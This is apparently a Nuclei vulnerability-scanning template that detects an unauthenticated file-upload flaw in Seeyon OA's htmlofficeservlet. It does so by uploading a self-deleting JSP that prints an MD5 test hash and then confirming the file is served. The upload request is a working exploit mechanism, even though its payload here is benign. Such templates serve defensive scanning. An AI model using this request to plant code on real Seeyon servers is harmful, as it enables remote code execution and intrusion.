id: seeyon-unauthorized-fileupload
info:
  name: Unauthorized File Upload in Seeyon
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template checks for unauthorized file upload vulnerability in Seeyon OA systems, allowing remote execution of uploaded malicious files.
    It verifies by uploading a harmless JSP file and later checking its response and availability.
    Note: The script attempts to self-delete the test file but may fail in some cases.
  reference:
    - https://www.secrss.com/articles/11759
    - https://www.jianshu.com/p/0955bdd7329c

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/seeyon/htmlofficeservlet"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "DBSTEP.*?operate err"

  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/seeyon/htmlofficeservlet"
    headers:
      Content-Type: text/html
    body: |
      DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
      OPTION=S3WYOSWLBSGr
      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
      CREATEDATE=wUghPB3szB3Xwg66
      RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
      originalFileId=wV66
      originalCreateDate=wUghPB3szB3Xwg66
      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdwLoGzYOfyUCAwUNCwYMCyUoEwighP4oXy4OJwLQCzAw5nHzs
      needReadFile=yRWZdAS6
      originalCreateDate=wLSGP4oEzLKAz4=iz=66
      <%@ page contentType="text/html;charset=UTF-8" language="java" %>
      <%@ page import="java.security.MessageDigest" %>
      <%@ page import="com.sun.org.apache.xerces.internal.impl.dv.util.HexBin" %>
      <%
          MessageDigest mdAlgorithm = MessageDigest.getInstance("md5");
          mdAlgorithm.reset();
          mdAlgorithm.update("just_a_test".getBytes());
          byte[] digest = mdAlgorithm.digest();
          out.println(HexBin.encode(digest).toLowerCase());
          new java.io.File(application.getRealPath(request.getServletPath())).delete();
      %>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DBSTEP"
      - type: word
        words:
          - "just_a_test"

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/seeyon/1255dbf9627d1bdf27301822d4a19d7c.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "c6db3524fe71d6c576098805a07e79e4"
